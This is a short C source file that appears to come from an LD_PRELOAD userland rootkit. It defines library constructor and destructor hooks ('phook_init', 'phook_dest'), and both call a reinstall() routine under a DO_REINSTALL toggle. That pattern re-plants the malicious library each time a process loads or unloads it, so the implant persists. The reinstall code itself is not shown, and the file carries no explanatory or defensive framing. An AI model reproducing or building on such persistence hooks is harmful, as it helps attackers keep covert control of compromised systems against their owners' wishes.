#define _GNU_SOURCE

#include "toggles.h"
#include "stdincludes.h"
#include "includes.h"

void __attribute ((constructor)) phook_init(void){
#ifdef DO_REINSTALL
    reinstall();
#endif
}

void __attribute ((destructor)) phook_dest(void){
#ifdef DO_REINSTALL
    reinstall();
#endif
}
